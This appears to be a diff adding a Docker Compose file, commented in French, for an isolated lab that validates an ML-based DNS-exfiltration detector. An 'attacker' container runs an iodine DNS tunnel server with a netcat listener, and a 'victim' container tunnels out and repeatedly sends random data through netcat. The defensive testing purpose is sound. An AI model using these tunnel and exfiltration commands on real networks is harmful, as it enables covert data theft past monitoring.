@@ -1,0 +1,97 @@
+# Mini-labo : une vraie exfiltration DNS (iodine) sur un réseau Docker isolé, observée par
+# exfildns. Validation en conditions réelles et démonstration, sans infrastructure externe.
+#   docker compose -f compose.labo.yaml up --build
+#   -> dashboard du labo sur http://localhost:8502
+#   docker compose -f compose.labo.yaml down -v    # tout arrêter et vider la base du labo
+# Prérequis : le modèle entraîné dans ./models/exfildns.keras ; /dev/net/tun sur l'hôte.
+# Le domaine tunnel.labo est fictif et le réseau « labo » est interne : rien ne sort.
+name: exfildns-labo
+
+x-iodine: &iodine
+  build: labo
+  image: exfildns-labo-iodine:local
+  # iodine crée une interface réseau virtuelle (tun) : seule capacité accordée
+  cap_drop: [ALL]
+  cap_add: [NET_ADMIN]
+  devices: ["/dev/net/tun"]
+  security_opt: ["no-new-privileges:true"]
+
+services:
+  # Serveur iodine faisant autorité sur tunnel.labo ; reçoit le fichier par le tunnel
+  attaquant:
+    <<: *iodine
+    # Mot de passe du tunnel : fictif, propre au labo
+    command:
+      - sh
+      - -c
+      - iodined -c -P labo 10.53.0.1 tunnel.labo && exec nc -lk 10.53.0.1 4444 > /dev/null
+    networks:
+      labo:
+        ipv4_address: 172.30.53.10
+
+  # Poste compromis : ouvre le tunnel (-r : DNS uniquement), y envoie 200 Ko, recommence
+  victime:
+    <<: *iodine
+    depends_on: [attaquant, sniff]
+    # Si le serveur n'est pas encore prêt, iodine échoue : on réessaie
+    restart: on-failure
+    command:
+      - sh
+      - -c
+      - >-
+        sleep 5 && iodine -r -P labo 172.30.53.10 tunnel.labo
+        && while true; do head -c 200000 /dev/urandom | nc -N 10.53.0.1 4444; sleep 30; done
+    networks:
+      labo:
+        ipv4_address: 172.30.53.20
+
+  # Capteur exfildns dans l'espace réseau de l'attaquant : il voit chaque requête DNS reçue
+  sniff:
+    build: .
+    image: exfildns-labo:local
+    user: "10001"
+    read_only: true
+    tmpfs: [/tmp]
+    environment:
+      TZ: ${TZ:-Europe/Paris}
+    network_mode: service:attaquant
+    cap_drop: [ALL]
+    cap_add: [NET_RAW]
+    entrypoint: ["python-capture", "-m", "exfildns.cli"]
+    command: [sniff, --interface, eth0, --base, /data/detections.db,
+              --modele, /models/exfildns.keras]
+    volumes:
+      - ./models:/models:ro
+      - detections:/data
+
+  dashboard:
+    image: exfildns-labo:local
+    depends_on: [sniff]
+    user: "10001"
+    read_only: true
+    tmpfs: [/tmp]
+    environment:
+      TZ: ${TZ:-Europe/Paris}
+    cap_drop: [ALL]
+    security_opt: ["no-new-privileges:true"]
+    command: [dashboard, --base, /data/detections.db, --modele, /models/exfildns.keras,
+              --adresse, 0.0.0.0, --statuts, /etat/statuts.db]
+    # Hors du réseau interne (un réseau interne ne peut pas publier de port) ; 8502 pour
+    # pouvoir tourner à côté du déploiement principal
+    ports:
+      - "127.0.0.1:8502:8501"
+    volumes:
+      - ./models:/models:ro
+      - detections:/data:ro
+      - statuts:/etat
+
+networks:
+  labo:
+    internal: true
+    ipam:
+      config:
+        - subnet: 172.30.53.0/24
+
+volumes:
+  detections:
+  statuts:
